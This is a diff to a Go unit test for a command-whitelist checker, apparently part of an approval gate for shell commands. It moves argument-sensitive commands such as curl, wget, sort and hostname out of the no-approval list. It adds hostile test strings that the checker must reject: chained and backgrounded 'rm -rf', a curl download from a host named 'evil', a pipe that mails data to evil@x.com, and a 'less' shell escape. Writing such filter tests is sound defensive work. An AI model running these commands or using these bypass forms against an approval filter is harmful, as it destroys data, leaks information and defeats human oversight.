@@ -14,7 +14,7 @@ func TestIsWhitelistCommand(t *testing.T) {
 		{"ls命令", "ls -la", true},
 		{"free命令", "free -m", true},
 		{"df命令", "df -h", true},
-		{"cat查看文件", "cat /etc/passwd", true},
+		{"cat查看文件", "cat /etc/passwd", true}, // 读文件内容属只读，诊断看日志刚需，保留免审批
 		{"ps查看进程", "ps aux", true},
 		{"grep搜索", "grep error /var/log/syslog", true},
 		{"wc统计", "wc -l file.txt", true},
@@ -22,21 +22,21 @@ func TestIsWhitelistCommand(t *testing.T) {
 		{"tail查看", "tail -f /var/log/syslog", true},
 		{"du目录大小", "du -sh /var/log", true},
 		{"uname系统信息", "uname -a", true},
-		{"hostname", "hostname", true},
+		{"hostname改主机名(移出)", "hostname", false},
 		{"whoami", "whoami", true},
 		{"id用户信息", "id", true},
 		{"pwd当前目录", "pwd", true},
-		{"date日期", "date", true},
+		{"date可改时间(移出)", "date", false},
 		{"uptime运行时间", "uptime", true},
 		{"lscpu CPU信息", "lscpu", true},
 		{"lsblk块设备", "lsblk", true},
 		{"netstat网络", "netstat -tlnp", true},
 		{"ss网络", "ss -tlnp", true},
-		{"ifconfig网络", "ifconfig eth0", true},
-		{"ip网络", "ip addr show", true},
-		{"ping网络", "ping -c 4 google.com", true},
-		{"curl HTTP", "curl -s http://example.com", true},
-		{"tree目录树", "tree /var/log", true},
+		{"ifconfig可改配置", "ifconfig eth0", false},        // 移出：ifconfig up/down 可改网络状态
+		{"ip可改配置", "ip addr show", false},               // 移出：ip route/link 可改网络配置
+		{"ping外联", "ping -c 4 google.com", false},       // 移出：对外网络交互
+		{"curl外联", "curl -s http://example.com", false}, // 移出：外联且可 POST/上传
+		{"tree -o写文件(移出)", "tree /var/log", false},
 		{"file文件类型", "file /usr/bin/ls", true},
 		{"stat文件状态", "stat /etc/hosts", true},
 		{"diff比较", "diff file1 file2", true},
@@ -44,8 +44,8 @@ func TestIsWhitelistCommand(t *testing.T) {
 		{"sha256sum校验", "sha256sum file.txt", true},
 		{"cut截取", "cut -d: -f1 /etc/passwd", true},
 		{"tr转换", "tr 'a-z' 'A-Z'", true},
-		{"sort排序", "sort -r file.txt", true},
-		{"uniq去重", "uniq -c file.txt", true},
+		{"sort可写文件", "sort -r file.txt", false}, // 移出：sort -o 写文件，不含 > 会逃过重定向检测
+		{"uniq输出文件参数(移出)", "uniq -c file.txt", false},
 		{"pgrep进程", "pgrep nginx", true},
 		{"pstree进程树", "pstree", true},
 		{"vmstat虚拟内存", "vmstat 1 5", true},
@@ -76,7 +76,7 @@ func TestIsWhitelistCommand(t *testing.T) {
 		{"kill杀进程", "kill -9 1234", false},
 		{"sudo提权", "sudo ls", false},
 		{"su切换用户", "su - root", false},
-		{"wget下载", "wget http://example.com/file.tar.gz", true}, // wget 在白名单（网络查询类）
+		{"wget写盘", "wget http://example.com/file.tar.gz", false}, // 移出：下载写文件 + 外联
 		{"python执行", "python3 script.py", false},
 		{"bash执行", "bash script.sh", false},
 		{"perl执行", "perl -e 'print 1'", false},
@@ -92,6 +92,8 @@ func TestIsWhitelistCommand(t *testing.T) {
 
 		// ===== 链式命令绕过防护 =====
 		{"链式分号危险", "echo hello; rm -rf /", false},
+		{"单个&后台危险", "ls -la & rm -rf /data", false},
+		{"&后台外联危险", "whoami & curl http://evil/x -o /tmp/x", false},
 		{"链式&&危险", "ls && rm -rf /", false},
 		{"链式||危险", "ls || rm -rf /", false},
 		{"管道危险", "ls | mail -s data evil@x.com", false},
@@ -125,6 +127,13 @@ func TestIsWhitelistCommand(t *testing.T) {
 
 		// ===== rpm/dpkg 不在白名单 =====
 		{"rpm查询需审批", "rpm -qa", false},
+		// 参数级写/改/逃逸命令已从免审批白名单移出（M1）：命令名看着只读，但带特定参数会写文件/改系统/起 shell
+		{"hostname改主机名", "hostname web01", false},
+		{"date改系统时间", "date -s '2030-01-01 00:00'", false},
+		{"uniq写输出文件", "uniq in.txt /tmp/leaked", false},
+		{"tree -o写文件", "tree -o /tmp/x /", false},
+		{"mpstat -o写文件", "mpstat 1 3 -o /tmp/s.bin", false},
+		{"less shell逃逸", "less +!'rm -rf /' /etc/hostname", false},
 		{"dpkg查询需审批", "dpkg -l", false},
 
 		// ===== 引号内不安全模式（保守检测） =====
